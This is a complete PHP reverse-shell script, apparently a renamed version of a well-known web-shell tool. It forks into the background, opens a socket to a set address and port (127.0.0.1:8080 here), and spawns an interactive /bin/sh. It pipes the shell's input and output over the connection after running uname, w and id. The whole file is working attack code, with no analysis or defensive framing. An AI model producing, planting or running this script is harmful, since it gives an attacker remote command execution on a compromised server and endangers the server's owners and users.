<?php
// Set time limit and define connection parameters
set_time_limit (0);
$ip_address 	= '127.0.0.1'; 	
$port_number 	= 8080;       	
$chunk_size 	= 1400;
$write_stream 	= null;
$error_stream 	= null;
$command 		= 'uname -a; w; id; /bin/sh -i';
$daemon_flag 	= 0;
$debug_flag 	= 0;

// Fork process if possible
if (function_exists('pcntl_fork')) {
  $pid = pcntl_fork();
  if ($pid == -1) {
    print_text("ERROR: Can't fork");
    exit(1);
  }
  if ($pid) {
    exit(0);
  }
  if (posix_setsid() == -1) {
    print_text("Error: Can't setsid()");
    exit(1);
  }
  $daemon_flag = 1;
} else {
  print_text("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Set up socket connection and check for errors
chdir("/");
umask(0);
$socket = fsockopen($ip_address, $port_number, $errno, $errstr, 30);
if (!$socket) {
  print_text("$errstr ($errno)");
  exit(1);
}

// Spawn shell and check for errors
$descriptors = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($command, $descriptors, $pipes);
if (!is_resource($process)) {
  print_text("ERROR: Can't spawn shell");
  exit(1);
}

// Set non-blocking streams and confirm successful connection
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($socket, 0);
print_text("Successfully Opened Reverse Shell On $ip_address:$port_number");

// Continuously transfer data between socket and pipes
while (1) {
  if (feof($socket)) {
    print_text("ERROR: Shell connection terminated");
    break;
  }
  if (feof($pipes[1])) {
    print_text("ERROR: Shell process terminated");
    break;
  }
  $read_stream = array($socket, $pipes[1], $pipes[2]);
  $num_changed_sockets = stream_select($read_stream, $write_stream, $error_stream, null);
  if (in_array($socket, $read_stream)) {
    if ($debug_flag) print_text("SOCK READ");
    $input = fread($socket, $chunk_size);
    if ($debug_flag) print_text("SOCK: $input");
    fwrite($pipes[0], $input);
  }
  if (in_array($pipes[1], $read_stream)) {
    if ($debug_flag) print_text("STDOUT READ");
    $input = fread($pipes[1], $chunk_size);
    if ($debug_flag) print_text("STDOUT: $input");
    fwrite($socket, $input);
  }
  if (in_array($pipes[2], $read_stream)) {
    if ($debug_flag) print_text("STDERR READ");
    $input = fread($pipes[2], $chunk_size);
    if ($debug_flag) print_text("STDERR: $input");
    fwrite($socket, $input);
  }
}

// Close streams and process and define function to print text if not daemon
fclose($socket);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function print_text ($string) {
  if (!$daemon_flag) {
    print "$string\n";
  }
}
?>